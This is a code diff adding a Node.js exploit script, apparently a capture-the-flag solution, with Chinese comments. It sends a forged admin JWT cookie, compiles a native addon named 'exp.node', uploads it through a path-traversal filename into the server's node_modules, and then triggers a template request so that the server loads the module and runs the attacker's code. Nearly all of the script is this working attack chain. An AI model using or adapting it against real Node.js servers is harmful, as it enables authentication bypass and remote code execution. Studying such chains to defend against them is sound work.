@@ -1,0 +1,65 @@
+// const {signJWT, verifyJWT} = require("./auth");
+const crypto = require("crypto");
+const http = require('http');
+const { execSync } = require('child_process');
+
+// if you want to generate token by yourself, uncomment below lines
+// const header = { alg: 'HS256', typ: 'JWT' };
+// const len=-(JSON.stringify(header).length+18);
+// token=signJWT({username:"admin",length:len},crypto.randomBytes(9).toString('hex'))
+// console.log(token)
+// console.log(verifyJWT(token,crypto.randomBytes(9).toString('hex')))
+
+token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwibGVuZ3RoIjotNDUsImlhdCI6MTc2MjE0MzU0MH0.674dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229"
+try {
+    execSync('npm install node-gyp && ./node_modules/.bin/node-gyp configure && ./node_modules/.bin/node-gyp build', {
+        stdio: 'inherit' // 直接打印输出
+    });
+    console.log('build success');
+} catch (e) {
+    console.error('❌ build error', e.message);
+}
+
+const fs = require('node:fs');
+const bin = fs.readFileSync('./build/Release/exp.node');
+const b64File = bin.toString('base64');                     // 文件编码为 Base64
+
+const data = JSON.stringify({ filename: '../node_modules/exp.node', filedata: b64File });
+const options = {
+    hostname: '127.0.0.1',   // 目标主机
+    port: 3000,                  // HTTP 默认端口
+    path: '/upload',                 // 请求路径
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(data),
+        'Cookie': `token=${encodeURIComponent(token)}`
+    }
+};
+const req = http.request(options, (res) => {
+    console.log(`req1状态码: ${res.statusCode}`);
+    // 响应结束时触发
+    res.on('end', () => {
+        console.log('响应接收完毕');
+    });
+});
+req.on('error', (err) => {
+    console.error('请求出错:', err);
+});
+req.write(data);
+req.end();
+
+
+req2=http.request(
+    {hostname:"127.0.0.1",
+    port:3000,
+    path:"/?templ=1.exp",
+    method:"GET",
+    },(res)=>{
+        console.log(`req2状态码: ${res.statusCode}`);
+        // 响应结束时触发
+        res.on('end', () => {
+            console.log('响应接收完毕');
+        });
+    });
+req2.end()
